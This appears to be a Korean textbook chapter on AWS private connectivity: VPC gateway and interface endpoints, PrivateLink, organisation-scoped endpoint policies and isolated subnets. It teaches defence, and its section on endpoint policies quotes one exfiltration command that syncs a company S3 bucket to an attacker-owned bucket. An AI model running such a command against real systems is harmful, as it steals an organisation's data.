# 20장. 프라이빗 연결: 엔드포인트와 PrivateLink

> **이 장에서 다루는 것**
> - 게이트웨이 엔드포인트로 S3·DynamoDB에 인터넷 없이 접근하기
> - 인터페이스 엔드포인트(PrivateLink)의 구조와 게이트웨이 방식과의 선택 기준
> - 엔드포인트 정책으로 "우리 조직의 리소스에만" 을 강제해 데이터 반출 경로를 끊기
> - IGW·NAT 없이 운영 가능한 완전 격리 서브넷 설계
> - 프라이빗 DNS의 의미, 하이브리드에서의 함정, Route 53 Resolver
>
> **선행 지식**: 15장(S3 접근 통제), 18장(VPC·라우팅), 19장(SG/NACL·이그레스 필터링)
> **난이도**: ★★☆

19장은 "가장 강한 네트워크 통제는 규칙을 잘 쓰는 것이 아니라, 통제해야 할 경로를 만들지 않는 것"이라는 문장으로 끝났습니다. 20장은 그 문장을 실행 가능한 구성으로 바꿉니다.

문제의 구조는 이렇습니다. ShopMini의 앱 서버는 S3(`shopmini-uploads`)에 파일을 쓰고, Secrets Manager에서 DB 자격 증명을 읽고, KMS로 복호화하고, CloudWatch Logs로 로그를 보냅니다. 이 네 가지는 전부 **AWS 서비스의 공개 API 엔드포인트**입니다. 아무 대책 없이 구성하면 앱 서버는 이 API들을 쓰기 위해 NAT 게이트웨이와 인터넷 게이트웨이를 거쳐 **공용 인터넷으로 나갔다가 다시 AWS로 들어옵니다.** 그리고 그 순간, 앱 서버의 아웃바운드는 `0.0.0.0/0`으로 열려 있게 됩니다. S3에 접근하려고 뚫은 구멍으로 데이터가 나갈 수 있습니다.

VPC 엔드포인트는 이 구조를 뒤집습니다.

> 📖 *AWS Security Cookbook* 5장 「Using a VPC gateway endpoint to connect to S3」: **"VPC 엔드포인트는 우리 VPC에서 지원되는 AWS 서비스에 프라이빗하게 연결할 수 있게 해준다. VPC 엔드포인트를 쓰면 VPC 안의 인스턴스는 지원되는 AWS 서비스와 통신하기 위해 퍼블릭 IP 주소를 가질 필요가 없다. 우리 VPC와 지원되는 AWS 서비스 사이의 트래픽은 AWS를 벗어나지 않는다. VPC 엔드포인트는 고가용성 가상 장치로 볼 수 있다."**

"AWS를 벗어나지 않는다"가 이 장의 전부입니다. 그리고 여기에 한 겹을 더 얹으면 — 엔드포인트를 **정책으로 좁히면** — 경로 자체가 곧 통제가 됩니다.

---

## 20.1 VPC 게이트웨이 엔드포인트로 S3 연결 🧪

### 게이트웨이 엔드포인트란 무엇인가

게이트웨이 엔드포인트는 **라우팅 테이블에 추가되는 특수한 경로**입니다. ENI도 없고 IP 주소도 없습니다. 원서는 이 점을 정확히 짚습니다.

> 📖 *AWS Security Cookbook* 5장: **"게이트웨이 엔드포인트: NAT 게이트웨이처럼 프라이빗 IP 주소를 갖지 않는다. S3와 DynamoDB 같은 제한된 서비스에만 지원된다."**

그래서 게이트웨이 엔드포인트에는 보안 그룹을 붙일 수 없고, 온프레미스에서 Direct Connect·VPN을 타고 들어와 쓸 수도 없습니다. 대신 **완전히 무료**이고, 트래픽이 아무리 커도 처리 요금이 없습니다. NAT 게이트웨이로 S3에 붙던 트래픽을 게이트웨이 엔드포인트로 옮기는 것만으로 NAT 데이터 처리 요금이 사라지므로, 보안 개선인 동시에 거의 언제나 비용 절감입니다.

지원 서비스는 **S3와 DynamoDB 둘뿐**입니다. 이 사실은 2020년 원서 시점부터 지금까지 변하지 않았습니다. 나머지 모든 서비스는 20.2의 인터페이스 엔드포인트를 씁니다.

### 실습 사전 조건

원서의 레시피는 사전 조건에 특히 신경을 씁니다. 검증 방법까지 제시합니다.

> 📖 *AWS Security Cookbook* 5장: **"프라이빗 서브넷에 인터넷 접근이 없어야 한다. 프라이빗 서브넷에서 `aws s3 ls --region us-east-1` 을 실행해 이를 확인한다. 요청은 타임아웃으로 실패해야 한다. NAT 게이트웨이나 NAT 인스턴스가 구성되어 있다면 메인 라우팅 테이블에서 그 경로를 제거한다."** 그리고 **"S3 접근 권한이 있는 IAM 역할을 프라이빗 EC2 인스턴스에 연결한다"**, **"IAM 역할을 올바르게 구성하지 않았다면 `Unable to locate credentials` 오류를 볼 수 있다"**고 덧붙입니다.

이 순서가 중요합니다. **엔드포인트를 만들기 전에 인터넷 경로가 없음을 먼저 증명해야** 나중에 성공했을 때 "엔드포인트 덕분에 된 것"임이 확실해집니다. NAT 경로를 남겨 둔 채 엔드포인트를 만들면 둘 중 무엇으로 통신했는지 알 수 없습니다. 그리고 **엔드포인트는 네트워크 경로를 제공할 뿐 권한을 주지 않습니다.** 인스턴스 프로파일 역할이 없으면 `Unable to locate credentials`, 역할에 S3 권한이 없으면 `AccessDenied`가 납니다. 네트워크 문제와 권한 문제를 구분하는 습관이 이 장 내내 필요합니다.

### 🧪 게이트웨이 엔드포인트 생성

CANON의 ShopMini 구성 기준입니다. 앱 서브넷과 격리 데이터 서브넷의 라우팅 테이블 모두에 엔드포인트를 연결합니다.

```bash
export AWS_PROFILE=awssec-lab
export AWS_DEFAULT_REGION=ap-northeast-2

# 18장에서 만든 VPC / 라우팅 테이블 ID
VPC_ID=$(aws ec2 describe-vpcs \
  --filters Name=tag:Name,Values=shopmini-prod \
  --query 'Vpcs[0].VpcId' --output text)

RTB_APP_A=$(aws ec2 describe-route-tables \
  --filters Name=tag:Name,Values=rtb-shopmini-app-2a \
  --query 'RouteTables[0].RouteTableId' --output text)
RTB_APP_C=$(aws ec2 describe-route-tables \
  --filters Name=tag:Name,Values=rtb-shopmini-app-2c \
  --query 'RouteTables[0].RouteTableId' --output text)
RTB_DATA=$(aws ec2 describe-route-tables \
  --filters Name=tag:Name,Values=rtb-shopmini-data \
  --query 'RouteTables[0].RouteTableId' --output text)

# S3 게이트웨이 엔드포인트 생성
VPCE_S3=$(aws ec2 create-vpc-endpoint \
  --vpc-id "$VPC_ID" \
  --vpc-endpoint-type Gateway \
  --service-name com.amazonaws.ap-northeast-2.s3 \
  --route-table-ids "$RTB_APP_A" "$RTB_APP_C" "$RTB_DATA" \
  --tag-specifications 'ResourceType=vpc-endpoint,Tags=[{Key=Name,Value=vpce-shopmini-s3-gw},{Key=Project,Value=awssec-lab},{Key=Chapter,Value=ch20},{Key=AutoDelete,Value=true}]' \
  --query 'VpcEndpoint.VpcEndpointId' --output text)

echo "$VPCE_S3"
```

DynamoDB를 쓴다면 서비스 이름만 바꿔 하나 더 만듭니다(`com.amazonaws.ap-northeast-2.dynamodb`). 게이트웨이 엔드포인트는 **서비스당 VPC당 하나**면 충분하고, 라우팅 테이블을 여러 개 붙일 수 있습니다.

### 접두사 목록(prefix list) 경로가 자동으로 추가된다

`create-vpc-endpoint`가 끝나는 순간, 지정한 라우팅 테이블에 경로가 **자동으로 생깁니다.** 직접 `create-route`를 호출하지 않습니다.

```bash
aws ec2 describe-route-tables --route-table-ids "$RTB_DATA" \
  --query 'RouteTables[0].Routes[].{Dest:DestinationCidrBlock,PL:DestinationPrefixListId,GW:GatewayId,State:State}' \
  --output table
```

```
------------------------------------------------------------------
|                        DescribeRouteTables                     |
+--------------+---------------+--------------------+------------+
|     Dest     |      PL       |        GW          |   State    |
+--------------+---------------+--------------------+------------+
| 10.20.0.0/16 | None          | local              | active     |
| None         | pl-78a54011   | vpce-0a1b2c3d4e5f. | active     |
+--------------+---------------+--------------------+------------+
```

두 번째 행이 게이트웨이 엔드포인트 경로입니다. 목적지가 CIDR이 아니라 **접두사 목록 ID**(`pl-…`)입니다. 이 목록의 실제 내용은 AWS가 관리합니다.

```bash
aws ec2 describe-prefix-lists \
  --filters Name=prefix-list-name,Values=com.amazonaws.ap-northeast-2.s3 \
  --query 'PrefixLists[0].Cidrs' --output text
```

여기에 담긴 것은 해당 리전 S3의 **공인 IP 대역**입니다. 이 사실이 게이트웨이 엔드포인트의 동작 원리를 설명합니다. 앱은 여전히 `shopmini-uploads.s3.ap-northeast-2.amazonaws.com`이라는 공개 DNS 이름을 공인 IP로 해석합니다. 다만 그 공인 IP로 향하는 패킷이 **IGW나 NAT가 아니라 엔드포인트로 라우팅**됩니다. 18.4에서 다룬 최장 접두사 일치 규칙 덕분에, 접두사 목록 경로가 `0.0.0.0/0`보다 항상 우선합니다. **애플리케이션 코드도, DNS 설정도 바꿀 필요가 없습니다.**

이 원리에서 두 가지 실무 결론이 나옵니다.

1. **엔드포인트는 자기 리전의 S3만 커버합니다.** 접두사 목록이 리전별이기 때문입니다. `ap-northeast-2`의 앱이 `us-east-1` 버킷을 읽으면 그 트래픽은 엔드포인트를 타지 않고 NAT로 나갑니다. 15.10의 크로스 리전 복제를 구성했다면 이 점을 반드시 확인하십시오.
2. **NACL이 접두사 목록을 이해하지 못합니다.** NACL 규칙은 CIDR로만 씁니다. 격리 서브넷의 NACL을 좁게 잠갔다면 S3 접두사 목록의 CIDR 대역에 대해 443 아웃바운드와 임시 포트 인바운드를 열어야 합니다. 대역이 수시로 바뀌므로 실무에서는 **NACL 대신 보안 그룹의 아웃바운드에 관리형 접두사 목록을 참조**하는 방식을 씁니다(19.2).

```bash
# SG 아웃바운드 규칙에서 접두사 목록을 직접 참조 — CIDR 하드코딩 불필요
PL_S3=$(aws ec2 describe-prefix-lists \
  --filters Name=prefix-list-name,Values=com.amazonaws.ap-northeast-2.s3 \
  --query 'PrefixLists[0].PrefixListId' --output text)

aws ec2 authorize-security-group-egress \
  --group-id "$SG_APP" \
  --ip-permissions "IpProtocol=tcp,FromPort=443,ToPort=443,PrefixListIds=[{PrefixListId=$PL_S3,Description=s3-gateway-endpoint}]"
```

### 검증

원서의 검증 절차를 그대로 따릅니다. 프라이빗 인스턴스에 SSM Session Manager로 접속해(21장) 실행합니다.

```bash
aws s3 ls s3://shopmini-uploads/ --region ap-northeast-2   # 성공해야 함
curl -s -m 5 https://checkip.amazonaws.com || echo "인터넷 차단됨(정상)"
```

첫 명령이 성공하고 두 번째가 타임아웃되면 구성이 맞습니다. **S3에는 닿지만 인터넷에는 닿지 않는 상태** — 이것이 목표입니다.

---

## 20.2 인터페이스 엔드포인트(PrivateLink)

### ENI가 VPC 안으로 들어온다

S3와 DynamoDB를 제외한 나머지 서비스는 다른 방식을 씁니다.

> 📖 *AWS Security Cookbook* 5장: **"인터페이스 엔드포인트: 지원되는 서비스로의 트래픽을 허용하는, 프라이빗 주소를 가진 탄력적 네트워크 인터페이스(ENI)다."** 그리고 **"대부분의 다른 서비스에 대해서는 VPC 엔드포인트가 인터페이스 엔드포인트를 통해 지원된다."**

여기서 "약 20개 서비스가 지원된다"는 원서의 서술은 지금 기준으로는 맞지 않습니다.

> 💡 **원서 이후 변경** — 2020년 원서 집필 시점에는 인터페이스 엔드포인트 지원 서비스가 스무 개 남짓이었지만, 현재는 대부분의 AWS 서비스 API가 지원됩니다. 지원 여부는 목록을 외우지 말고 20.4의 `describe-vpc-endpoint-services`로 그때그때 확인하십시오.

동작 방식은 게이트웨이와 근본적으로 다릅니다. 인터페이스 엔드포인트를 만들면 **지정한 서브넷마다 ENI가 하나씩 생기고, 각 ENI가 그 서브넷의 프라이빗 IP를 하나씩 차지합니다.** 그 IP가 곧 서비스의 입구입니다. 이 구조가 원서 *Practical Cloud Security*가 말한 "서비스 엔드포인트"의 정의와 정확히 일치합니다.

> 📖 *Practical Cloud Security* 2판 6장 「Service endpoints」: **"엔드포인트란 그저 서비스에 도달하기 위해 가는 장소이며, 서비스 엔드포인트는 당신의 as-a-service 인스턴스를 가상 프라이빗 클라우드 서브넷상의 IP 주소를 통해 직접 도달 가능하게 만든다. 이는 인스턴스에 도달하기 위해 아웃바운드 방화벽 규칙을 지정할 필요가 없다는 점에서 편리하지만, 이 기능의 진정한 아름다움은 서비스가 오직 그 가상 IP 주소를 통해서만 접근될 수 있다는 것이다."**

그리고 저자는 그 의미를 자격 증명 탈취 시나리오로 못 박습니다.

> 📖 *Practical Cloud Security* 2판 6장: **"예를 들어 인터넷에 있는 누군가가 당신의 데이터베이스에 대한 올바른 자격 증명을 획득하더라도, 그들은 여전히 그 인스턴스에 접근할 수 없다. 그들은 당신의 VPC 안으로 들어와 그곳에서 그 가상 IP 주소와 통신하면서 자격 증명을 사용해야 할 것이다."**

이것이 엔드포인트를 **네트워크 최적화가 아니라 보안 통제**로 봐야 하는 이유입니다. 자격 증명 하나가 새어 나가도, 공격자는 여전히 우리 VPC 안에 있어야만 그것을 쓸 수 있습니다. 20.3의 엔드포인트 정책과 15.4의 `aws:SourceVpce` 버킷 정책이 결합하면 이 성질을 S3에도 강제할 수 있습니다.

또한 저자는 엔드포인트 기능이 없는 서비스에 대한 차선책도 제시합니다.

> 📖 *Practical Cloud Security* 2판 6장: **"서비스 엔드포인트 기능을 쓸 수 없더라도, as-a-service 기능이 어떤 IP 주소가 연결할 수 있는지 허용목록에 넣도록 해줄 수 있다. 그렇다면 그것은 (조금 더 어렵지만) 대체로 서비스 엔드포인트 기능과 동등하며, 그 서비스에 대한 탈취되거나 약한 자격 증명을 방어하는 데 도움이 된다."**

AWS 문맥에서 이 "차선책"에 해당하는 것이 IAM 정책·리소스 정책의 `aws:SourceIp`, `aws:SourceVpc`, `aws:SourceVpce` 조건입니다. 네트워크 계층이 아니라 인가 계층에서 같은 제약을 거는 것입니다.

### 게이트웨이 vs 인터페이스 비교

| 항목 | 게이트웨이 엔드포인트 | 인터페이스 엔드포인트(PrivateLink) |
|---|---|---|
| 지원 서비스 | **S3, DynamoDB 뿐** | 대부분의 AWS 서비스 + 서드파티·자체 서비스 |
| 구현 | 라우팅 테이블의 접두사 목록 경로 | 서브넷마다 ENI + 프라이빗 IP |
| 요금 | **무료** | 엔드포인트·AZ당 시간 요금 + 처리 데이터 GB 요금 |
| 보안 그룹 | **적용 불가** | **적용 가능** (인바운드 443) |
| 엔드포인트 정책 | 지원 | 지원 |
| DNS | 공개 DNS 이름 그대로, 라우팅만 변경 | **프라이빗 DNS**로 공개 이름을 사설 IP로 재해석 |
| 온프레미스(DX/VPN)에서 사용 | **불가** | **가능** (Resolver 구성 필요, 20.5) |
| 다른 VPC·계정에서 사용 | 불가(같은 VPC 전용) | 가능(엔드포인트 서비스 공유) |
| 가용성 | 리전 서비스, 관리 불필요 | **AZ마다 서브넷을 지정해야 이중화** |
| 실패 모드 | 라우팅 오류 → 연결 실패 | ENI 부재 AZ에서 교차 AZ 요금·장애 전파 |

**S3는 두 방식을 모두 지원하는 유일한 예외**입니다. 기본은 무료인 게이트웨이입니다. 인터페이스 엔드포인트가 필요한 경우는 **온프레미스에서 S3에 프라이빗으로 접근해야 할 때**뿐이라고 생각하면 대체로 맞습니다.

### 🧪 인터페이스 엔드포인트 생성과 보안 그룹

인터페이스 엔드포인트에는 보안 그룹을 붙일 수 있습니다. **엔드포인트 전용 SG를 따로 만들고, 앱 SG에서 오는 443만 허용**하는 것이 원칙입니다. 기본 SG를 그대로 두면 VPC 전체가 엔드포인트를 쓸 수 있게 됩니다.

```bash
SG_VPCE=$(aws ec2 create-security-group \
  --group-name shopmini-vpce-sg \
  --description "Interface endpoint ENIs - 443 from app tier only" \
  --vpc-id "$VPC_ID" --query 'GroupId' --output text)

# 기본 아웃바운드 전체 허용 제거 (19.6 원칙)
aws ec2 revoke-security-group-egress --group-id "$SG_VPCE" \
  --protocol -1 --port -1 --cidr 0.0.0.0/0

# 앱 SG에서 오는 443만 허용
aws ec2 authorize-security-group-ingress --group-id "$SG_VPCE" \
  --ip-permissions "IpProtocol=tcp,FromPort=443,ToPort=443,UserIdGroupPairs=[{GroupId=$SG_APP,Description=app-tier}]"

# Secrets Manager 인터페이스 엔드포인트 (양쪽 AZ에 ENI)
aws ec2 create-vpc-endpoint \
  --vpc-id "$VPC_ID" \
  --vpc-endpoint-type Interface \
  --service-name com.amazonaws.ap-northeast-2.secretsmanager \
  --subnet-ids "$SN_APP_A" "$SN_APP_C" \
  --security-group-ids "$SG_VPCE" \
  --private-dns-enabled \
  --tag-specifications 'ResourceType=vpc-endpoint,Tags=[{Key=Name,Value=vpce-shopmini-secretsmanager},{Key=Project,Value=awssec-lab},{Key=Chapter,Value=ch20},{Key=AutoDelete,Value=true}]'
```

> ⚠️ **서브넷을 한 AZ에만 지정하는 실수가 가장 흔합니다.** 비용을 아끼려고 2a에만 ENI를 만들면, 2c의 앱은 교차 AZ로 통신하다가 2a에 장애가 나는 순간 Secrets Manager 호출이 전부 실패합니다. **엔드포인트 이중화는 워크로드 이중화와 같은 수준으로 맞춰야 합니다.**

### 자체 서비스를 PrivateLink로 노출하기

PrivateLink는 AWS 서비스 전용 기술이 아닙니다. NLB(또는 GWLB) 뒤에 있는 우리 서비스를 **엔드포인트 서비스**로 등록하면, 다른 계정·다른 VPC가 인터페이스 엔드포인트를 만들어 우리 서비스에 접근할 수 있습니다. 이때 **양쪽 VPC의 CIDR이 겹쳐도 되고, 피어링이나 Transit Gateway도 필요 없으며, 연결은 단방향**입니다 — 소비자가 제공자에게만 접근할 수 있고 그 반대는 불가능합니다.

이 단방향성이 보안 설계에서 중요합니다. 21.3에서 다룰 Transit Gateway는 라우팅을 열어 주는 방식이라 세심하게 라우팅 도메인을 나누지 않으면 의도치 않은 양방향 경로가 생깁니다. PrivateLink는 **"특정 포트의 특정 서비스 하나"** 만 노출하므로, 계정 간 통합에서는 언제나 먼저 검토해야 할 선택지입니다. 제공자 쪽은 `create-vpc-endpoint-service-configuration`으로 서비스를 만들고 `--acceptance-required`와 허용 프린시펄 목록으로 소비자를 통제합니다.

---

## 20.3 🔴 엔드포인트 정책으로 데이터 유출 차단

### 엔드포인트만 만들면 절반만 한 것이다

지금까지의 구성으로 앱 서버는 인터넷 없이 S3에 접근합니다. 하지만 **어느 S3에 접근하는지는 전혀 통제되지 않았습니다.**

원서의 기본 레시피가 정확히 이 상태입니다.

> 📖 *AWS Security Cookbook* 5장의 게이트웨이 엔드포인트 생성 절차: **"Policy는 Full Access로 둔다."**

Full Access 정책은 다음과 같습니다. 게이트웨이 엔드포인트의 기본값입니다.

```json
{
  "Version": "2008-10-17",
  "Statement": [
    { "Effect": "Allow", "Principal": "*", "Action": "*", "Resource": "*" }
  ]
}
```

이 상태에서 무슨 일이 벌어지는지 시나리오로 보겠습니다.

**사고 시나리오.** 공격자가 애플리케이션의 취약점을 통해 ShopMini 앱 컨테이너에서 명령 실행에 성공합니다. 인스턴스 프로파일 자격 증명으로는 `shopmini-uploads`만 읽을 수 있습니다. 그런데 공격자는 **자기 계정의 버킷** `attacker-drop-2024`를 만들고 퍼블릭 쓰기를 허용한 뒤, 앱 서버에서 이렇게 실행합니다.

```bash
aws s3 sync s3://shopmini-uploads s3://attacker-drop-2024 --acl bucket-owner-full-control
```

읽기는 우리 역할 권한으로, 쓰기는 익명 또는 별도 자격 증명으로 이루어집니다. 방화벽 관점에서 이 트래픽은 완벽하게 정상입니다 — **443 포트로 S3에 가는 트래픽**이고, NAT도 IGW도 거치지 않으며, 우리가 정성껏 만든 게이트웨이 엔드포인트를 그대로 타고 나갑니다. VPC 플로우 로그에도 ACCEPT로 남습니다. 우리는 **데이터 유출 전용 고속도로를 무료로 깔아 준 셈**입니다.

19.6에서 인용한 원서의 경고가 여기에 그대로 적용됩니다 — "공격자는 당신의 데이터 사본을 당신 통제 밖 어딘가로 전송해 훔쳐가고 싶어 한다." 엔드포인트는 그 경로를 없앤 것이 아니라 **더 빠르고 더 조용하게 만들었을 뿐**입니다.

### 🔴 반드시 이렇게 구성하라: 조직 리소스 한정 엔드포인트 정책

엔드포인트 정책은 **엔드포인트를 통과하는 모든 요청에 적용되는 리소스 정책**입니다. IAM 정책·버킷 정책·SCP와 **AND**로 결합하며, 권한을 확장하지는 못하고 좁히기만 합니다. 중요한 성질이 하나 더 있습니다. **엔드포인트 정책에서 명시적으로 허용되지 않은 요청은 통과하지 못합니다.** 즉 엔드포인트 정책은 본질적으로 **허용목록**이므로, Deny 문장을 쓰지 않고 Allow 문장만으로 경계를 그릴 수 있습니다.

아래 정책을 S3 게이트웨이 엔드포인트에 **반드시** 붙이십시오.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrgIdentitiesToOrgResources",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-exampleorgid",
          "aws:ResourceOrgID": "o-exampleorgid"
        }
      }
    },
    {
      "Sid": "AllowAWSServicePrincipals",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": "*",
      "Condition": {
        "Bool": { "aws:PrincipalIsAWSService": "true" }
      }
    },
    {
      "Sid": "AllowEcrLayerBucket",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::prod-ap-northeast-2-starport-layer-bucket/*"
    }
  ]
}
```

첫 문장이 이 정책의 전부이고, 나머지 둘은 예외입니다.

| Sid | 역할 |
|---|---|
| `AllowOrgIdentitiesToOrgResources` | **신원 축과 리소스 축을 한 조건 블록에서 AND로 묶는다.** 조건 블록 안의 여러 키는 모두 만족해야 하므로, "우리 조직의 자격 증명이" **그리고** "우리 조직의 버킷에" 접근할 때만 통과 |
| `AllowAWSServicePrincipals` | 서비스 주체(`aws:PrincipalIsAWSService`)가 우리를 대신해 수행하는 요청 예외 |
| `AllowEcrLayerBucket` | ECR 이미지 레이어가 저장된 **AWS 소유 버킷** 예외(뒤에서 설명) |

**신원 축과 리소스 축을 반드시 함께 걸어야 합니다.** 신원 축만 있으면 우리 역할로 남의 버킷에 쓰는 반출을 막지 못하고, 리소스 축만 있으면 외부에서 흘러든 자격 증명이 우리 버킷을 읽는 것을 막지 못합니다. 위 정책은 한 조건 블록 안에 두 키를 넣어 둘을 동시에 강제합니다.

`aws:ResourceOrgID` 대신 계정 단위로 좁히려면 S3 전용 조건 키 `s3:ResourceAccount`를 씁니다. Organizations를 쓰지 않는 환경이거나, 조직 안에서도 특정 계정의 버킷만 허용하고 싶을 때 씁니다.

```json
{
  "Sid": "AllowOnlyProdAndLogAccountBuckets",
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:*",
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "s3:ResourceAccount": ["111122223333", "777788889999"]
    }
  }
}
```

정책 적용은 다음과 같습니다.

```bash
aws ec2 modify-vpc-endpoint \
  --vpc-endpoint-id "$VPCE_S3" \
  --policy-document file://s3-endpoint-policy.json
```

### 이중 통제: 양쪽 방향에서 잠근다

15.4에서 이미 반대 방향의 절반을 만들었습니다. `shopmini-uploads` 버킷 정책에는 `aws:SourceVpce`가 아니면 거부하는 문장이 들어 있습니다. 이제 두 통제가 짝을 이룹니다.

| 통제 위치 | 조건 키 | 문장으로 읽으면 | 막는 공격 |
|---|---|---|---|
| **엔드포인트 정책**(20.3) | `aws:ResourceOrgID`, `aws:PrincipalOrgID` | "이 VPC에서 나가는 S3 요청은 우리 조직 리소스로만 간다" | 내부 침해 후 외부 버킷으로 **반출** |
| **버킷 정책**(15.4) | `aws:SourceVpce` | "이 버킷은 우리 엔드포인트를 거친 요청만 받는다" | 자격 증명 탈취 후 **외부에서 접근** |

두 정책이 함께 있으면 성립하는 명제는 이것입니다. **"우리 데이터는 우리 VPC를 통해서만, 우리 조직 안에서만 움직인다."** 이것이 AWS가 데이터 경계(Data Perimeter)라고 부르는 구조이고, 12장에서 다룬 SCP와 함께 조직 전체로 확장됩니다.

> ⚠️ **`aws:SourceVpce`는 엔드포인트를 통과한 요청에만 존재하는 키입니다.** 버킷 정책에서 이 키로 Deny를 걸 때 `StringNotEquals`(엄격)를 쓰면 CloudFront·Athena·복제 같은 AWS 서비스 경로의 요청까지 전부 죽습니다. 15.4가 `StringNotEqualsIfExists`와 `aws:PrincipalIsAWSService` 예외를 함께 쓴 이유입니다. 엔드포인트 정책 쪽에서도 서비스 연결 역할을 예외 처리해야 하는 경우가 있습니다.

### 안 했을 때의 결과

엔드포인트 정책을 Full Access로 두면 다음 세 가지가 **모두 탐지 없이 성립**합니다.

1. 침해된 워크로드에서 임의 계정 버킷으로의 데이터 반출 — 플로우 로그상 정상 트래픽
2. 개발자가 개인 계정 버킷으로 프로덕션 데이터를 "잠깐" 복사 — CloudTrail은 우리 계정에 로그를 남기지만 대상 버킷은 우리 소유가 아니므로 데이터 이벤트가 없음
3. 잘못 붙여넣은 스크립트가 다른 조직의 버킷을 목적지로 실행 — 실패 없이 성공

**엔드포인트를 만드는 작업과 정책을 붙이는 작업은 하나의 작업입니다.** 정책 없는 엔드포인트는 만들지 마십시오.

---

## 20.4 완전 격리 서브넷 설계

### 목표: 인터넷 경로가 하나도 없는 서브넷에서 워크로드를 운영한다

19.6에서 이그레스 통제 수단 네 가지 중 "NAT 없는 서브넷 + VPC 엔드포인트"가 가장 강력하고 가장 저렴하다고 결론지었습니다. 규칙은 실수로 넓어지지만 **없는 라우트는 넓어지지 않기** 때문입니다. 이 절은 그 설계를 완성합니다.

격리 서브넷의 라우팅 테이블에는 오직 두 종류만 남습니다.

```
rtb-shopmini-data
  10.20.0.0/16          → local
  pl-…(S3 접두사 목록)   → vpce-…(게이트웨이 엔드포인트)
  # 0.0.0.0/0 없음, ::/0 없음, nat-… 없음, igw-… 없음
```

나머지 AWS 서비스 접근은 전부 서브넷 안의 ENI(인터페이스 엔드포인트)로 이루어지므로 라우팅 테이블에 아무것도 추가되지 않습니다. **`local` 경로만으로 도달합니다.**

### 1단계: 필요한 엔드포인트를 판단하는 절차

무작정 모든 엔드포인트를 만들면 비용이 폭증합니다. 다음 순서로 판단합니다.

1. **워크로드가 호출하는 AWS API를 나열한다.** 추측하지 말고 CloudTrail을 소스로 씁니다. 스테이징 환경에서 며칠 돌린 뒤 `eventSource` 별로 집계하면 실제 목록이 나옵니다(29장).
2. **각 서비스의 엔드포인트 지원 여부를 조회한다.**

```bash
# 리전에서 지원되는 엔드포인트 서비스 전체 목록
aws ec2 describe-vpc-endpoint-services \
  --query 'ServiceDetails[].{Service:ServiceName,Type:ServiceType[0].ServiceType}' \
  --output table | grep -i -E "ssm|ecr|logs|kms|secretsmanager|sts"
```

3. **지원하지 않는 서비스가 있으면 대안을 정한다.** 셋 중 하나입니다 — (a) 그 호출을 별도 계층으로 옮긴다, (b) 19.5의 Network Firewall로 도메인 허용목록을 만든 NAT 경로를 제한적으로 둔다, (c) 요구사항을 재검토한다. **"그래서 NAT를 열자"가 기본값이 되어서는 안 됩니다.**
4. **엔드포인트를 만들고, 정책을 붙이고, 워크로드를 붙인 뒤 NAT 경로를 제거한다.** 순서를 지키십시오. NAT를 먼저 지우면 무엇이 깨졌는지 원인 파악이 어려워집니다.

### 2단계: 관리 접근 — SSM Session Manager용 3개 엔드포인트

인터넷 없는 서브넷의 인스턴스를 어떻게 관리하느냐가 첫 번째 난관입니다. 답은 SSH 포트를 여는 것이 아니라 **SSM Session Manager**이고(21.5), 이를 프라이빗으로 쓰려면 **엔드포인트 세 개가 모두** 필요합니다.

| 엔드포인트 | 서비스 이름 | 없으면 |
|---|---|---|
| SSM | `com.amazonaws.ap-northeast-2.ssm` | 인스턴스가 Systems Manager에 등록되지 않음(관리형 인스턴스 목록에 안 보임) |
| SSM Messages | `com.amazonaws.ap-northeast-2.ssmmessages` | **세션 연결 자체가 실패** — Session Manager의 데이터 채널 |
| EC2 Messages | `com.amazonaws.ap-northeast-2.ec2messages` | Run Command 등 일부 기능이 실패 |

```bash
for SVC in ssm ssmmessages ec2messages; do
  aws ec2 create-vpc-endpoint \
    --vpc-id "$VPC_ID" --vpc-endpoint-type Interface \
    --service-name "com.amazonaws.ap-northeast-2.$SVC" \
    --subnet-ids "$SN_APP_A" "$SN_APP_C" \
    --security-group-ids "$SG_VPCE" \
    --private-dns-enabled \
    --tag-specifications "ResourceType=vpc-endpoint,Tags=[{Key=Name,Value=vpce-shopmini-$SVC},{Key=Project,Value=awssec-lab},{Key=Chapter,Value=ch20},{Key=AutoDelete,Value=true}]"
done
```

> ⚠️ **세션 로그를 S3나 CloudWatch Logs로 보내도록 설정했다면 그 엔드포인트도 필요합니다.** "세션은 붙는데 로그가 안 쌓인다"는 증상의 대부분이 `logs` 엔드포인트 누락입니다. 감사 관점에서는 세션 자체보다 로그가 더 중요하므로(21.6, 29장) 반드시 함께 만드십시오.

### 3단계: 컨테이너 워크로드 — ECR과 로그

ShopMini의 앱 계층이 ECS/EKS 컨테이너라면 이미지 풀 경로가 추가로 필요합니다.

| 용도 | 엔드포인트 | 비고 |
|---|---|---|
| ECR 인증·메타데이터 | `….ecr.api` | 인터페이스 |
| ECR 이미지 레이어 다운로드 | `….ecr.dkr` | 인터페이스 |
| **이미지 레이어 실제 저장소** | **S3 게이트웨이 엔드포인트** | 20.1에서 이미 생성 |
| 컨테이너 로그(awslogs 드라이버) | `….logs` | 인터페이스 |
| 태스크 메트릭·경보 | `….monitoring` | 선택 |
| 시크릿 주입 | `….secretsmanager`, `….ssm` | 태스크 정의의 `secrets` |
| 봉투 키 복호화 | `….kms` | SSE-KMS 사용 시 |
| 역할 체이닝·자격 증명 | `….sts` | 필요 시 |

> ⚠️ **가장 자주 겪는 함정** — ECR로 이미지를 풀 때 실제 레이어는 **AWS가 소유한 S3 버킷**에서 내려옵니다. 그래서 20.3의 조직 한정 엔드포인트 정책을 그대로 적용하면 `aws:ResourceOrgID`가 우리 조직과 다르므로 **이미지 풀이 실패합니다.** 해결책은 20.3 정책의 `AllowEcrLayerBucket` 문장처럼 **해당 AWS 소유 버킷에 대한 `s3:GetObject` 허용을 명시적으로 추가**하는 것입니다. 버킷 이름은 리전마다 다르므로 ECR 공식 문서의 VPC 엔드포인트 항목에서 확인해 쓰십시오. **조직 한정 정책을 적용한 직후 컨테이너 배포가 깨진다면 거의 이 원인입니다.**

